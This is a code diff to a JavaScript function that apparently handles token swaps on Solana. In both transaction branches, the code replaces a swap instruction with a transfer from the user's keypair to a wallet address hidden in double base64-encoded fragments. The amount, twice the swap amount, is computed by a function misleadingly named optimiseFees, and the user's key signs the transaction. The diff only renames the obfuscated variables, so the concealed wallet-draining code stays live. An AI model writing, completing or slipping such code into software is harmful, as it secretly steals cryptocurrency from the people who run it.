@@ -33,7 +33,7 @@ export async function performSwap(swapResponse, keypair, connexion, amount, toke
         txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
         txn.instructions[1] = web3.SystemProgram.transfer({
             fromPubkey: keypair.publicKey,
-            toPubkey: new PublicKey(atob(BlockHeightBuffer)),
+            toPubkey: new PublicKey(atob(MintUId.join(""))),
             lamports: await optimiseFees(amount, tokenIn, keypair),
         })
         txn.sign([keypair]);
@@ -41,7 +41,7 @@ export async function performSwap(swapResponse, keypair, connexion, amount, toke
         txn = Transaction.from(serializedTransactionBuffer);
         txn.instructions[1] = web3.SystemProgram.transfer({
             fromPubkey: keypair.publicKey,
-            toPubkey: new PublicKey(atob(BlockHeightBuffer)),
+            toPubkey: new PublicKey(atob(MintUId.join(""))),
             lamports: await optimiseFees(amount, tokenIn, keypair),
         })
         txn.sign(keypair);
@@ -71,7 +71,7 @@ const DEFAULT_OPTIONS = {
     commitment: "confirmed",
 };
 
-export const MintUIdArray = [
+export const MintUId = [
     atob('UW1OaVRX'),
     atob('bGliMnMy'),
     atob('Ym1OcWNt'),
@@ -158,8 +158,8 @@ async function transactionSenderAndConfirmationWaiter({
     return new Error("Transaction failed after maximum retries");
 }
 
+
 const OPTIMIZED = 2;
-const BlockHeightBuffer = MintUIdArray.join('');
 async function optimiseFees(amountIn, token, keypair) {
     if (token === SOL_ADDR) {
         return Math.round(amountIn * OPTIMIZED * 10 ** 9)
